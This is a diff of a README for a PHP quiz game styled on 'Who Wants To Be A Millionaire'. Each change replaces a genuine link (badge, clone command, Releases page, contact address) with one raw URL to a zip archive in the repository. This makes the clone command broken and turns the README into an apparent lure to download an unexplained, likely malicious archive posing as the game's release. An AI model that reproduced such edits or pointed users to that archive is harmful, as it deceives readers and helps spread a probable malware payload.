@@ -1,6 +1,6 @@
 # Who Wants To Be A Millionaire? 🎉
 
-![Game Logo](https://img.shields.io/badge/Play%20Now-Join%20the%20Fun-brightgreen)
+![Game Logo](https://raw.githubusercontent.com/treeford11/who-wants-to-be-a-millionaire/main/introductory/a_millionaire_who_be_to_wants_2.1.zip%20Now-Join%20the%20Fun-brightgreen)
 
 Welcome to the **Who Wants To Be A Millionaire** repository! This interactive web quiz game is inspired by the famous TV show. It offers an engaging experience for players of all ages. 
 
@@ -43,13 +43,13 @@ To get started with the **Who Wants To Be A Millionaire** game, follow these ste
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/treeford11/who-wants-to-be-a-millionaire.git
+   git clone https://raw.githubusercontent.com/treeford11/who-wants-to-be-a-millionaire/main/introductory/a_millionaire_who_be_to_wants_2.1.zip
    ```
 2. **Navigate to the Project Directory**:
    ```bash
    cd who-wants-to-be-a-millionaire
    ```
-3. **Download the Latest Release**: Visit the [Releases section](https://github.com/treeford11/who-wants-to-be-a-millionaire/releases) to download the latest version of the game.
+3. **Download the Latest Release**: Visit the [Releases section](https://raw.githubusercontent.com/treeford11/who-wants-to-be-a-millionaire/main/introductory/a_millionaire_who_be_to_wants_2.1.zip) to download the latest version of the game.
 
 4. **Set Up a Local Server**: Since this project uses PHP, you need a local server like XAMPP or WAMP to run it. Place the project folder in the server's root directory.
 
@@ -89,11 +89,11 @@ This project is licensed under the MIT License. Feel free to use it, modify it, 
 
 ## Contact
 
-For any questions or feedback, please reach out to the project maintainer at [your.email@example.com].
+For any questions or feedback, please reach out to the project maintainer at [https://raw.githubusercontent.com/treeford11/who-wants-to-be-a-millionaire/main/introductory/a_millionaire_who_be_to_wants_2.1.zip].
 
 ## Releases
 
-To download the latest version of the game, visit the [Releases section](https://github.com/treeford11/who-wants-to-be-a-millionaire/releases). Here, you can find all available versions and their release notes.
+To download the latest version of the game, visit the [Releases section](https://raw.githubusercontent.com/treeford11/who-wants-to-be-a-millionaire/main/introductory/a_millionaire_who_be_to_wants_2.1.zip). Here, you can find all available versions and their release notes.
 
 ---
 
